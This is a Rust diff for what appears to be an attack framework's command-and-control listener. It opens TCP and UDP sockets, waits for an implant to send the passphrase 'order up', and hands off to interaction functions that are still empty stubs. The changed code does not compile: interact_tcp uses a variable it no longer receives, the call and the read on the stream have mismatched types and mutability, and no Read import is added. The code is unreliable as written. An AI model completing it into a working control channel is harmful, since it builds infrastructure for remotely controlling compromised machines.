@@ -1,5 +1,5 @@
 use std::process::Command;
-use std::net::{UdpSocket, SocketAddr, TcpListener};
+use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
 
 //pub struct info {
 //  arch: String,
@@ -25,9 +25,26 @@ pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr){
     }
 }
 
-    // listens using a TcpListener
+// listens using a TcpListener
 pub fn listen_tcp(lsn: &mut Listener, address: SocketAddr){
+    lsn.status = 1;
+    lsn.tcp_sock = TcpListener::bind(address).unwrap();
     println!("[+] Opening tcp listener on port {}", address.port());
+    // effectively the same as calling lsn.tcp_sock.accept() in a loop
+    for stream in lsn.tcp_sock.incoming() {
+        let mut buffer = [0; 2048];
+        let bytes = stream.read(&buffer[..]).unwrap();
+
+        // replace insides of .contains() with whatever string/key we are using to verify connection
+        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
+            lsn.status = 2;
+            // switches to interact mode
+            interact_tcp(stream);
+            lsn.status = 1;
+        }
+        stream.shutdown(Shutdown::Both).expect("shutdown call failed");
+    }
+    lsn.status = 0;
 }
 
 // listens using a UdpSocket
@@ -42,22 +59,21 @@ pub fn listen_udp(lsn: &mut Listener, address: SocketAddr){
         // replace insides of .contains() with whatever string/key we are using to verify connection
         if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
             lsn.status = 2;
-            // call a seperate function which interacts with the target
-            // that way, if the target connection ends, the listener just
-            // automatically goes back to listening
-            // pass src to this function (which contains the implant's IP as a SocketAddr struct)
+            // switches to interact mode
             interact_udp(lsn, src);
+            lsn.status = 1;
         }
-        lsn.status = 1;
     }
     lsn.status = 0;
 }
 
 fn interact_udp(lsn: &mut Listener, target: SocketAddr) {
+    println!("[+] Connection established by listener {}", lsn.id);
     // TODO
 }
 
-fn interact_tcp(lsn: &mut Listener, target: SocketAddr) {
+fn interact_tcp(stream: &mut TcpStream) {
+    println!("[+] Connection established by listener {}", lsn.id);
     // TODO
 }
 
